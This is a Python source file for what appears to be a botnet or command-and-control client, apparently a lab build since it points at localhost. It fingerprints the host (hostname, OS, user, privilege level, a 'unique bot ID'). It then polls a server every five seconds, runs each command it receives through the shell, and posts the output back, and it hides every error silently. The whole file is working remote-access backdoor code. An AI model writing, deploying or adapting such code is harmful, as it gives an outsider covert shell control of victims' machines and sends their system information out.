import requests
import subprocess
import time
import platform
import uuid
import socket
import os

SERVER_URL = "http://127.0.0.1:5000"  # Updated to use port 5000

def detect_os():
    """Detect the operating system and return 'Windows' or 'Linux'."""
    os_name = platform.system()
    if os_name == "Windows":
        return "Windows"
    elif os_name == "Linux":
        return "Linux"
    else:
        return "Unknown"

# Assign detected OS to a variable
OS = detect_os()

def get_system_info():
    """Collect system information based on the detected OS."""
    system_info = {
        "id": str(uuid.uuid4()),  # Unique bot ID
        "hostname": socket.gethostname(),
        "os": OS,
        "arch": platform.machine(),
    }

    if OS == "Windows":
        system_info.update({
            "kernel": platform.version(),
            "user": os.getlogin(),
            "privilege": "Admin" if os.name == "nt" and os.getuid() == 0 else "User"
        })
    elif OS == "Linux":
        system_info.update({
            "kernel": platform.version(),
            "user": os.getlogin(),
            "privilege": "Root" if os.geteuid() == 0 else "User"
        })
    
    return system_info


# Track the current working directory (starting with the root or default directory)
current_directory = "/"

def execute_command(command):
    """Execute the shell command, update current directory if 'cd' command is issued."""
    global current_directory
    try:
        # If the command is 'cd', update the current directory
        if command.startswith("cd "):
            # Extract the directory path from the command
            new_directory = command[3:].strip()
            # If it's an absolute path, use it directly; otherwise, make it relative
            if new_directory.startswith("/"):
                current_directory = new_directory
            else:
                current_directory = os.path.join(current_directory, new_directory)
            return f"Changed directory to {current_directory}"

        # For other commands, execute them in the current directory
        result = subprocess.run(command, shell=True, cwd=current_directory, text=True, capture_output=True)

        # Return the output or error if any
        if result.returncode == 0:
            return result.stdout
        else:
            return result.stderr
    except subprocess.CalledProcessError as e:
        return f"Error: {e.output}"

while True:
    try:
        # Fetch command from the server every 5 seconds
        response = requests.get(f"{SERVER_URL}/command-transmission-to-client", timeout=5)  # Set timeout for the request
        
        # Check if the response status is OK
        if response.status_code == 200:
            command = response.json().get("command")
            
            # If there's a command, execute it
            if command:
                print(command)  # for logging, remove later
                result = execute_command(command)
                
                # Send the result back to the server
                result_response = requests.post(f"{SERVER_URL}/execution-result-of-command-from-client", json={"result": result})
                
                # Check if the result was successfully sent
                if result_response.status_code != 200:
                    pass  # Do nothing on failure
        else:
            pass  # Do nothing if no command or bad status response from server

    except (requests.exceptions.RequestException, Exception):
        # Handle any error (like server down, no response, or timeout) silently
        pass
    
    # Wait for 5 seconds before the next request
    time.sleep(5)
